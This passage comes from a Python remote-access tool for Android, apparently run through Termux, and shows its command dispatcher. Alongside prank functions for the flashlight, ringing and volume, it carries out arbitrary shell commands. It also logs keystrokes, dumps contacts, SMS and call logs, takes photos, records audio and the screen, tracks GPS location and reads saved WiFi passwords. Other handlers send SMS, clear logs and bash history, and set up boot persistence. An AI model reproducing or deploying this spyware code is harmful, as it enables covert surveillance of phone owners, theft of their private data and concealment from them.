                if code == 0:
                    storage = subprocess.check_output("df -h 2>/dev/null || echo 'Storage unavailable'", shell=True, text=True, timeout=10)
                    output = f"{stdout}\n\nStorage:\n{storage}".encode()
                else:
                    output = f"Battery status unavailable: {stderr}".encode()
                
            elif data == 'logs':
                try:
                    log_cmd = "netstat -an 2>/dev/null || ss -an 2>/dev/null || echo 'Network stats unavailable'; echo ''; uptime 2>/dev/null || echo 'Uptime unavailable'"
                    output = subprocess.check_output(log_cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Logs unavailable"
                
            elif data.startswith('cmd:'):
                real_cmd = data.split('cmd:')[1]
                try:
                    output = subprocess.check_output(real_cmd, shell=True, stderr=subprocess.STDOUT, timeout=15)
                except Exception as e:
                    output = str(e).encode()
            
            elif data == 'flash_on':
                stdout, stderr, code = termux_cmd("termux-torch", ["on"], timeout=10)
                if code == 0:
                    output = b"Flashlight turned ON"
                else:
                    output = f"Flashlight control failed: {stderr}".encode()
                
            elif data == 'flash_off':
                stdout, stderr, code = termux_cmd("termux-torch", ["off"], timeout=10)
                if code == 0:
                    output = b"Flashlight turned OFF"
                else:
                    output = f"Flashlight control failed: {stderr}".encode()
            
            elif data == 'flash_toggle':
                stdout, stderr, code = termux_cmd("termux-torch", ["status"], timeout=10)
                if code == 0:
                    if 'on' in stdout.lower():
                        termux_cmd("termux-torch", ["off"], timeout=10)
                        output = b"Flashlight toggled OFF"
                    else:
                        termux_cmd("termux-torch", ["on"], timeout=10)
                        output = b"Flashlight toggled ON"
                else:
                    output = f"Flashlight toggle failed: {stderr}".encode()
            
            elif data == 'flicker':
                try:
                    for i in range(10):
                        termux_cmd("termux-torch", ["on"], timeout=10)
                        time.sleep(0.2)
                        termux_cmd("termux-torch", ["off"], timeout=10)
                        time.sleep(0.2)
                    output = b"Flashlight flickered 10 times"
                except:
                    output = b"Flicker failed"
            
            elif data.startswith('flick_speed:'):
                try:
                    speed = float(data.split('flick_speed:')[1])
                    for i in range(10):
                        termux_cmd("termux-torch", ["on"], timeout=10)
                        time.sleep(speed)
                        termux_cmd("termux-torch", ["off"], timeout=10)
                        time.sleep(speed)
                    output = f"Flashlight flickered 10 times at {speed}s intervals".encode()
                except:
                    output = b"Invalid speed"
            
            elif data == 'disco':
                try:
                    for i in range(10):
                        speed = 0.5 - (i * 0.045)
                        termux_cmd("termux-torch", ["on"], timeout=10)
                        time.sleep(speed)
                        termux_cmd("termux-torch", ["off"], timeout=10)
                        time.sleep(speed)
                    output = b"Disco effect completed"
                except:
                    output = b"Disco effect failed"
            
            elif data == 'sos':
                try:
                    for i in range(3):
                        termux_cmd("termux-torch", ["on"], timeout=10)
                        time.sleep(0.3)
                        termux_cmd("termux-torch", ["off"], timeout=10)
                        time.sleep(0.2)
                    time.sleep(0.5)
                    for i in range(3):
                        termux_cmd("termux-torch", ["on"], timeout=10)
                        time.sleep(0.8)
                        termux_cmd("termux-torch", ["off"], timeout=10)
                        time.sleep(0.2)
                    time.sleep(0.5)
                    for i in range(3):
                        termux_cmd("termux-torch", ["on"], timeout=10)
                        time.sleep(0.3)
                        termux_cmd("termux-torch", ["off"], timeout=10)
                        time.sleep(0.2)
                    output = b"SOS signal sent"
                except:
                    output = b"SOS signal failed"
            
            elif data == 'screen_flicker':
                try:
                    for i in range(10):
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(0.2)
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(0.2)
                    output = b"Screen flickered 10 times"
                except:
                    output = b"Screen flicker failed"
            
            elif data.startswith('screen_speed:'):
                try:
                    speed = float(data.split('screen_speed:')[1])
                    for i in range(10):
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(speed)
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(speed)
                    output = f"Screen flickered 10 times at {speed}s intervals".encode()
                except:
                    output = b"Invalid speed"
            
            elif data == 'screen_disco':
                try:
                    for i in range(10):
                        speed = 0.5 - (i * 0.045)
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(speed)
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(speed)
                    output = b"Screen disco effect completed"
                except:
                    output = b"Screen disco failed"
            
            elif data == 'flicker_combo':
                try:
                    for i in range(10):
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        termux_cmd("termux-torch", ["on"], timeout=10)
                        time.sleep(0.2)
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        termux_cmd("termux-torch", ["off"], timeout=10)
                        time.sleep(0.2)
                    output = b"Combo flicker (screen + flashlight) completed"
                except:
                    output = b"Combo flicker failed"
            
            elif data == 'screen_sos':
                try:
                    for i in range(3):
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(0.3)
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(0.2)
                    time.sleep(0.5)
                    for i in range(3):
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(0.8)
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(0.2)
                    time.sleep(0.5)
                    for i in range(3):
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(0.3)
                        subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                        time.sleep(0.2)
                    output = b"SOS screen signal sent"
                except:
                    output = b"SOS screen failed"
            
            elif data.startswith('google:'):
                query = data.split('google:')[1]
                try:
                    cmd = f"am start -a android.intent.action.VIEW -d 'https://www.google.com/search?q={query.replace(' ', '%20')}'"
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = f"Opened Google search: {query}".encode()
                except:
                    output = b"Failed to open Google"
            
            elif data.startswith('youtube:'):
                query = data.split('youtube:')[1]
                try:
                    cmd = f"am start -a android.intent.action.VIEW -d 'https://www.youtube.com/results?search_query={query.replace(' ', '+')}'"
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = f"Opened YouTube search: {query}".encode()
                except:
                    output = b"Failed to open YouTube"
            
            elif data == 'youtube_trending':
                try:
                    cmd = "am start -a android.intent.action.VIEW -d 'https://www.youtube.com/feed/trending'"
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = b"Opened YouTube Trending"
                except:
                    output = b"Failed to open YouTube Trending"
            
            elif data.startswith('images:'):
                query = data.split('images:')[1]
                try:
                    cmd = f"am start -a android.intent.action.VIEW -d 'https://www.google.com/search?q={query.replace(' ', '%20')}&tbm=isch'"
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = f"Opened Google Images: {query}".encode()
                except:
                    output = b"Failed to open Google Images"
            
            elif data.startswith('news:'):
                query = data.split('news:')[1]
                try:
                    cmd = f"am start -a android.intent.action.VIEW -d 'https://news.google.com/search?q={query.replace(' ', '%20')}'"
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = f"Opened Google News: {query}".encode()
                except:
                    output = b"Failed to open Google News"
            
            elif data.startswith('searchboth:'):
                query = data.split('searchboth:')[1]
                try:
                    cmd1 = f"am start -a android.intent.action.VIEW -d 'https://www.google.com/search?q={query.replace(' ', '%20')}'"
                    subprocess.Popen(cmd1, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(1)
                    cmd2 = f"am start -a android.intent.action.VIEW -d 'https://www.youtube.com/results?search_query={query.replace(' ', '+')}'"
                    subprocess.Popen(cmd2, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = f"Opened both Google and YouTube for: {query}".encode()
                except:
                    output = b"Failed to open search"
            
            elif data.startswith('play:'):
                video_id = data.split('play:')[1]
                try:
                    cmd = f"am start -a android.intent.action.VIEW -d 'https://www.youtube.com/watch?v={video_id}'"
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = f"Playing YouTube video: {video_id}".encode()
                except:
                    output = b"Failed to play video"
            
            elif data == 'keylogger_start':
                try:
                    cmd = "getevent -t 2>/dev/null | grep -E 'KEY_[A-Z]' > /sdcard/keylog.txt &"
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = b"Keylogger started on target (requires root)"
                except:
                    output = b"Keylogger start failed (requires root)"
            
            elif data == 'keylogger_stop':
                try:
                    cmd = "pkill -f getevent 2>/dev/null; cat /sdcard/keylog.txt 2>/dev/null"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"No keylog data found"
            
            elif data == 'contacts':
                try:
                    cmd = "content query --uri content://contacts/phones 2>/dev/null | head -30"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not fetch contacts"
            
            elif data == 'sms':
                try:
                    cmd = "content query --uri content://sms/inbox 2>/dev/null | head -20"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not fetch SMS"
            
            elif data == 'calllogs':
                try:
                    cmd = "content query --uri content://call_log/calls 2>/dev/null | head -20"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not fetch call logs"
            
            elif data == 'photo':
                stdout, stderr, code = termux_cmd("termux-camera-photo", ["-c", "0", f"/sdcard/photo_{int(time.time())}.jpg"], timeout=15)
                if code == 0:
                    output = b"Photo saved to /sdcard/"
                else:
                    output = f"Camera failed: {stderr}".encode()
            
            elif data.startswith('record:'):
                duration = data.split('record:')[1]
                stdout, stderr, code = termux_cmd("termux-microphone-record", ["-d", duration, "-f", f"/sdcard/audio_{int(time.time())}.mp3"], timeout=int(duration)+5)
                if code == 0:
                    output = f"Audio recorded for {duration}s".encode()
                else:
                    output = f"Recording failed: {stderr}".encode()
            
            elif data == 'location':
                stdout, stderr, code = termux_cmd("termux-location", timeout=15)
                if code == 0 and stdout:
                    output = stdout.encode()
                else:
                    output = f"Location not available: {stderr}".encode()

            elif data == 'location_link':
                stdout, stderr, code = termux_cmd("termux-location", timeout=15)
                if code == 0 and stdout:
                    try:
                        loc = json.loads(stdout)
                        lat = loc.get('latitude', 'Unknown')
                        lng = loc.get('longitude', 'Unknown')
                        output = f"Google Maps Link: https://www.google.com/maps?q={lat},{lng}\nLatitude: {lat}\nLongitude: {lng}".encode()
                    except:
                        output = b"Could not parse location"
                else:
                    output = f"Location not available: {stderr}".encode()

            elif data == 'location_details':
                stdout, stderr, code = termux_cmd("termux-location", timeout=15)
                if code == 0 and stdout:
                    try:
                        loc = json.loads(stdout)
                        details = f"Latitude: {loc.get('latitude', 'N/A')}\nLongitude: {loc.get('longitude', 'N/A')}\nAltitude: {loc.get('altitude', 'N/A')}\nAccuracy: {loc.get('accuracy', 'N/A')}\nBearing: {loc.get('bearing', 'N/A')}\nSpeed: {loc.get('speed', 'N/A')}"
                        output = details.encode()
                    except:
                        output = b"Could not parse location"
                else:
                    output = f"Location details not available: {stderr}".encode()

            elif data == 'location_save':
                stdout, stderr, code = termux_cmd("termux-location", timeout=15)
                if code == 0 and stdout:
                    timestamp = time.strftime('%Y-%m-%d %H:%M:%S')
                    with open('/sdcard/location_history.txt', 'a') as f:
                        f.write(f"{timestamp}: {stdout}\n")
                    output = f"Location saved to /sdcard/location_history.txt\n{stdout}".encode()
                else:
                    output = f"Location not available: {stderr}".encode()

            elif data == 'location_track':
                stdout, stderr, code = termux_cmd("termux-location", ["-p", "gps", "-r", "5"], timeout=15)
                if code == 0 and stdout:
                    output = stdout.encode()
                else:
                    stdout2, stderr2, code2 = termux_cmd("termux-location", ["-p", "network", "-r", "5"], timeout=15)
                    if code2 == 0 and stdout2:
                        output = stdout2.encode()
                    else:
                        output = f"Location tracking not available: {stderr}".encode()
            
            elif data == 'wifipass':
                try:
                    cmd = "cat /data/misc/wifi/wpa_supplicant.conf 2>/dev/null || echo 'WiFi passwords not accessible (need root)'"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"WiFi passwords not accessible"
            
            elif data.startswith('call:'):
                number = data.split('call:')[1]
                stdout, stderr, code = termux_cmd("termux-telephony-call", [number], timeout=10)
                if code == 0:
                    output = f"Calling {number}".encode()
                else:
                    output = f"Call failed: {stderr}".encode()
            
            elif data.startswith('sendsms:'):
                parts = data.split('sendsms:')[1].split(',')
                if len(parts) >= 2:
                    number, message = parts[0], ','.join(parts[1:])
                    stdout, stderr, code = termux_cmd("termux-sms-send", ["-n", number, message], timeout=10)
                    if code == 0:
                        output = f"SMS sent to {number}".encode()
                    else:
                        output = f"SMS failed: {stderr}".encode()
                else:
                    output = b"Invalid format. Use: number,message"
            
            elif data.startswith('vibrate:'):
                duration = data.split('vibrate:')[1]
                stdout, stderr, code = termux_cmd("termux-vibrate", ["-d", duration], timeout=10)
                if code == 0:
                    output = f"Vibrating for {duration}ms".encode()
                else:
                    output = f"Vibrate failed: {stderr}".encode()
            
            elif data == 'lock':
                try:
                    subprocess.run(["input", "keyevent", "KEYCODE_POWER"], capture_output=True, timeout=5)
                    output = b"Device locked"
                except:
                    output = b"Could not lock device"
            
            elif data.startswith('volume:'):
                level = data.split('volume:')[1]
                stdout, stderr, code = termux_cmd("termux-volume", ["music", level], timeout=10)
                if code == 0:
                    output = f"Volume set to {level}".encode()
                else:
                    output = f"Volume failed: {stderr}".encode()
            
            elif data.startswith('volume_percent:'):
                try:
                    percent = int(data.split('volume_percent:')[1])
                    if 0 <= percent <= 100:
                        level = int((percent / 100) * 15)
                        termux_cmd("termux-volume", ["music", str(level)], timeout=10)
                        output = f"Volume set to {percent}% (level {level}/15)".encode()
                    else:
                        output = b"Invalid percentage. Use 0-100"
                except:
                    output = b"Invalid percentage format"

            elif data == 'volume_up':
                try:
                    stdout, stderr, code = termux_cmd("termux-volume", ["music"], timeout=10)
                    current = 0
                    if code == 0 and stdout:
                        match = re.search(r'(\d+)', stdout)
                        if match:
                            current = int(match.group(1))
                    new_vol = min(current + 2, 15)
                    termux_cmd("termux-volume", ["music", str(new_vol)], timeout=10)
                    percent = int((new_vol / 15) * 100)
                    output = f"Volume increased to {percent}%".encode()
                except:
                    output = b"Volume up failed"

            elif data == 'volume_down':
                try:
                    stdout, stderr, code = termux_cmd("termux-volume", ["music"], timeout=10)
                    current = 0
                    if code == 0 and stdout:
                        match = re.search(r'(\d+)', stdout)
                        if match:
                            current = int(match.group(1))
                    new_vol = max(current - 2, 0)
                    termux_cmd("termux-volume", ["music", str(new_vol)], timeout=10)
                    percent = int((new_vol / 15) * 100)
                    output = f"Volume decreased to {percent}%".encode()
                except:
                    output = b"Volume down failed"

            elif data == 'volume_max':
                termux_cmd("termux-volume", ["music", "15"], timeout=10)
                output = b"Volume set to 100% (MAX)"

            elif data == 'volume_min':
                termux_cmd("termux-volume", ["music", "0"], timeout=10)
                output = b"Volume set to 0% (MUTED)"

            elif data == 'volume_mute':
                termux_cmd("termux-volume", ["music", "0"], timeout=10)
                output = b"Volume MUTED"

            elif data == 'volume_unmute':
                termux_cmd("termux-volume", ["music", "8"], timeout=10)
                output = b"Volume UNMUTED (50%)"

            elif data == 'volume_status':
                stdout, stderr, code = termux_cmd("termux-volume", ["music"], timeout=10)
                if code == 0 and stdout:
                    match = re.search(r'(\d+)', stdout)
                    if match:
                        current = int(match.group(1))
                        percent = int((current / 15) * 100)
                        output = f"Current Volume: {percent}% (level {current}/15)".encode()
                    else:
                        output = b"Could not get volume status"
                else:
                    output = f"Volume status failed: {stderr}".encode()

            elif data.startswith('volume_smooth_up:'):
                try:
                    target = int(data.split('volume_smooth_up:')[1])
                    if 0 <= target <= 100:
                        stdout, stderr, code = termux_cmd("termux-volume", ["music"], timeout=10)
                        current = 0
                        if code == 0 and stdout:
                            match = re.search(r'(\d+)', stdout)
                            if match:
                                current = int(match.group(1))
                        target_level = int((target / 100) * 15)
                        if current < target_level:
                            for i in range(current, target_level + 1):
                                termux_cmd("termux-volume", ["music", str(i)], timeout=5)
                                time.sleep(0.1)
                            output = f"Volume smoothly increased to {target}%".encode()
                        else:
                            output = f"Volume already at or above {target}%".encode()
                    else:
                        output = b"Invalid percentage. Use 0-100"
                except:
                    output = b"Invalid format"

            elif data.startswith('volume_smooth_down:'):
                try:
                    target = int(data.split('volume_smooth_down:')[1])
                    if 0 <= target <= 100:
                        stdout, stderr, code = termux_cmd("termux-volume", ["music"], timeout=10)
                        current = 0
                        if code == 0 and stdout:
                            match = re.search(r'(\d+)', stdout)
                            if match:
                                current = int(match.group(1))
                        target_level = int((target / 100) * 15)
                        if current > target_level:
                            for i in range(current, target_level - 1, -1):
                                termux_cmd("termux-volume", ["music", str(i)], timeout=5)
                                time.sleep(0.1)
                            output = f"Volume smoothly decreased to {target}%".encode()
                        else:
                            output = f"Volume already at or below {target}%".encode()
                    else:
                        output = b"Invalid percentage. Use 0-100"
                except:
                    output = b"Invalid format"

            elif data.startswith('volume_jump_up:'):
                try:
                    jump = int(data.split('volume_jump_up:')[1])
                    stdout, stderr, code = termux_cmd("termux-volume", ["music"], timeout=10)
                    current = 0
                    if code == 0 and stdout:
                        match = re.search(r'(\d+)', stdout)
                        if match:
                            current = int(match.group(1))
                    jump_level = int((jump / 100) * 15)
                    new_vol = min(current + jump_level, 15)
                    termux_cmd("termux-volume", ["music", str(new_vol)], timeout=10)
                    percent = int((new_vol / 15) * 100)
                    output = f"Volume jumped up by {jump}% to {percent}%".encode()
                except:
                    output = b"Invalid format"

            elif data.startswith('volume_jump_down:'):
                try:
                    jump = int(data.split('volume_jump_down:')[1])
                    stdout, stderr, code = termux_cmd("termux-volume", ["music"], timeout=10)
                    current = 0
                    if code == 0 and stdout:
                        match = re.search(r'(\d+)', stdout)
                        if match:
                            current = int(match.group(1))
                    jump_level = int((jump / 100) * 15)
                    new_vol = max(current - jump_level, 0)
                    termux_cmd("termux-volume", ["music", str(new_vol)], timeout=10)
                    percent = int((new_vol / 15) * 100)
                    output = f"Volume jumped down by {jump}% to {percent}%".encode()
                except:
                    output = b"Invalid format"

            elif data == 'volume_fadeout':
                try:
                    stdout, stderr, code = termux_cmd("termux-volume", ["music"], timeout=10)
                    current = 0
                    if code == 0 and stdout:
                        match = re.search(r'(\d+)', stdout)
                        if match:
                            current = int(match.group(1))
                    for i in range(current, -1, -1):
                        termux_cmd("termux-volume", ["music", str(i)], timeout=5)
                        time.sleep(0.2)
                    output = b"Volume faded out to 0%"
                except:
                    output = b"Volume fadeout failed"

            elif data == 'volume_fadein':
                try:
                    stdout, stderr, code = termux_cmd("termux-volume", ["music"], timeout=10)
                    current = 0
                    if code == 0 and stdout:
                        match = re.search(r'(\d+)', stdout)
                        if match:
                            current = int(match.group(1))
                    for i in range(0, current + 1):
                        termux_cmd("termux-volume", ["music", str(i)], timeout=5)
                        time.sleep(0.2)
                    output = b"Volume faded in to current level"
                except:
                    output = b"Volume fadein failed"

            elif data.startswith('volume_type:'):
                parts = data.split('volume_type:')[1].split(',')
                if len(parts) == 2:
                    stream, level = parts[0], parts[1]
                    termux_cmd("termux-volume", [stream, level], timeout=10)
                    output = f"Set {stream} to {level}".encode()
                else:
                    output = b"Invalid format. Use: stream,level"
            
            elif data == 'ring':
                try:
                    subprocess.Popen(["termux-media-player", "play", "/system/media/audio/ringtones/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.Popen(["termux-tts-speak", "RING RING RING"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.Popen(["termux-vibrate", "-d", "5000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = b"Phone ringing started!"
                except:
                    output = b"Could not ring phone"

            elif data == 'ring_stop':
                try:
                    subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True, timeout=5)
                    subprocess.run(["pkill", "-f", "termux-tts-speak"], capture_output=True, timeout=5)
                    subprocess.run(["pkill", "-f", "termux-vibrate"], capture_output=True, timeout=5)
                    output = b"Ringing stopped"
                except:
                    output = b"Could not stop ringing"

            elif data.startswith('ring_pattern:'):
                try:
                    duration = int(data.split('ring_pattern:')[1])
                    subprocess.Popen(["termux-media-player", "play", "/system/media/audio/ringtones/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    subprocess.Popen(["termux-vibrate", "-d", str(duration * 1000)], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(duration)
                    subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True, timeout=5)
                    subprocess.run(["pkill", "-f", "termux-vibrate"], capture_output=True, timeout=5)
                    output = f"Phone ringing for {duration} seconds!".encode()
                except:
                    output = b"Invalid duration"

            elif data == 'ring_emergency':
                try:
                    termux_cmd("termux-volume", ["music", "15"], timeout=5)
                    termux_cmd("termux-volume", ["ring", "15"], timeout=5)
                    for i in range(10):
                        subprocess.Popen(["termux-media-player", "play", "/system/media/audio/alarms/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.Popen(["termux-vibrate", "-d", "1000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(1)
                        subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True, timeout=5)
                        subprocess.run(["pkill", "-f", "termux-vibrate"], capture_output=True, timeout=5)
                        time.sleep(0.5)
                    output = b"Emergency ringing started!"
                except:
                    output = b"Could not start emergency ring"

            elif data == 'ring_with_flash':
                try:
                    for i in range(10):
                        termux_cmd("termux-torch", ["on"], timeout=10)
                        subprocess.Popen(["termux-media-player", "play", "/system/media/audio/ringtones/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.5)
                        termux_cmd("termux-torch", ["off"], timeout=10)
                        subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True, timeout=5)
                        time.sleep(0.5)
                    output = b"Ringing with flashlight started!"
                except:
                    output = b"Could not start ring with flash"

            elif data == 'ring_sos':
                try:
                    for i in range(3):
                        subprocess.Popen(["termux-media-player", "play", "/system/media/audio/ringtones/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.Popen(["termux-vibrate", "-d", "300"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.5)
                        subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True, timeout=5)
                        subprocess.run(["pkill", "-f", "termux-vibrate"], capture_output=True, timeout=5)
                        time.sleep(0.2)
                    time.sleep(0.5)
                    for i in range(3):
                        subprocess.Popen(["termux-media-player", "play", "/system/media/audio/ringtones/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.Popen(["termux-vibrate", "-d", "800"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(1)
                        subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True, timeout=5)
                        subprocess.run(["pkill", "-f", "termux-vibrate"], capture_output=True, timeout=5)
                        time.sleep(0.2)
                    time.sleep(0.5)
                    for i in range(3):
                        subprocess.Popen(["termux-media-player", "play", "/system/media/audio/ringtones/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.Popen(["termux-vibrate", "-d", "300"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(0.5)
                        subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True, timeout=5)
                        subprocess.run(["pkill", "-f", "termux-vibrate"], capture_output=True, timeout=5)
                        time.sleep(0.2)
                    output = b"SOS ring pattern started!"
                except:
                    output = b"Could not start SOS ring"

            elif data == 'ring_custom':
                try:
                    for i in range(5):
                        subprocess.Popen(["termux-media-player", "play", "/system/media/audio/ringtones/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        subprocess.Popen(["termux-vibrate", "-d", "1000"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                        time.sleep(2)
                        subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True, timeout=5)
                        subprocess.run(["pkill", "-f", "termux-vibrate"], capture_output=True, timeout=5)
                        time.sleep(1)
                    output = b"Custom ringing started!"
                except:
                    output = b"Could not start custom ring"

            elif data == 'ring_volume_max':
                try:
                    termux_cmd("termux-volume", ["music", "15"], timeout=5)
                    termux_cmd("termux-volume", ["ring", "15"], timeout=5)
                    termux_cmd("termux-volume", ["notification", "15"], timeout=5)
                    subprocess.Popen(["termux-media-player", "play", "/system/media/audio/ringtones/"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    time.sleep(3)
                    subprocess.run(["pkill", "-f", "termux-media-player"], capture_output=True, timeout=5)
                    output = b"Max volume ringing started!"
                except:
                    output = b"Could not start max volume ring"

            elif data == 'ring_loop':
                try:
                    cmd = """
                    while true; do
                        termux-media-player play /system/media/audio/ringtones/ 2>/dev/null &
                        termux-vibrate -d 2000 2>/dev/null &
                        sleep 2
                        pkill -f termux-media-player 2>/dev/null
                        pkill -f termux-vibrate 2>/dev/null
                        sleep 1
                    done
                    """
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = b"Continuous ringing started! (Use ring_stop to stop)"
                except:
                    output = b"Could not start loop ring"

            elif data == 'screenshot':
                try:
                    cmd = "screencap -p /sdcard/screenshot_$(date +%s).png 2>/dev/null && echo 'Screenshot saved to /sdcard/' || echo 'Screenshot failed'"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Screenshot failed"
            
            elif data == 'screenshot_timestamp':
                try:
                    cmd = "screencap -p /sdcard/screenshot_$(date '+%Y%m%d_%H%M%S').png 2>/dev/null && echo 'Screenshot saved with timestamp' || echo 'Screenshot failed'"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Screenshot failed"
            
            elif data.startswith('screenshot_loop:'):
                try:
                    count = int(data.split('screenshot_loop:')[1])
                    for i in range(count):
                        cmd = f"screencap -p /sdcard/screenshot_{i}_{int(time.time())}.png 2>/dev/null"
                        subprocess.check_output(cmd, shell=True, stderr=subprocess.DEVNULL, timeout=10)
                        time.sleep(2)
                    output = f"Captured {count} screenshots".encode()
                except:
                    output = b"Invalid count"
            
            elif data == 'screenshot_full':
                try:
                    cmd = """
                    FILENAME="/sdcard/screenshot_$(date '+%Y%m%d_%H%M%S').png"
                    screencap -p $FILENAME 2>/dev/null
                    if [ -f "$FILENAME" ]; then
                        echo "Screenshot saved: $FILENAME"
                        echo "File size: $(du -h $FILENAME | cut -f1)"
                    else
                        echo "Screenshot failed"
                    fi
                    """
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Screenshot failed"
            
            elif data.startswith('screenrecord:'):
                duration = data.split('screenrecord:')[1]
                try:
                    cmd = f"screenrecord --time-limit {duration} /sdcard/screen_$(date +%s).mp4 2>/dev/null && echo 'Screen recorded for {duration}s' || echo 'Screen record failed'"
                    subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
                    output = f"Screen recording started for {duration} seconds".encode()
                except:
                    output = b"Screen record failed"
            
            elif data == 'processes':
                try:
                    cmd = "ps aux 2>/dev/null | head -30 || ps 2>/dev/null | head -30"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not fetch processes"
            
            elif data.startswith('kill:'):
                pid = data.split('kill:')[1]
                try:
                    cmd = f"kill -9 {pid} 2>/dev/null && echo 'Killed process {pid}' || echo 'Kill failed'"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not kill process"
            
            elif data == 'cpu':
                try:
                    cmd = "cat /proc/cpuinfo 2>/dev/null | head -20"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not fetch CPU info"
            
            elif data == 'memory':
                try:
                    cmd = "cat /proc/meminfo 2>/dev/null"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not fetch memory info"
            
            elif data == 'clearlogs':
                try:
                    cmd = "logcat -c 2>/dev/null; rm -rf ~/.bash_history 2>/dev/null; echo 'Logs cleared' || echo 'Clear logs failed'"
                    output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=10)
                except:
                    output = b"Could not clear logs"
            
            elif data == 'autostart':
                try:
                    cmd = """
                    mkdir -p /data/data/com.termux/files/home/.termux/boot/
                    echo '#!/system/bin/sh' > /data/data/com.termux/files/home/.termux/boot/start.sh
                    echo 'python3 /data/data/com.termux/files/home/gangs.py' >> /data/data/com.termux/files/home/.termux/boot/start.sh
                    chmod +x /data/data/com.termux/files/home/.termux/boot/start.sh
                    echo 'Auto-start configured'
                    """
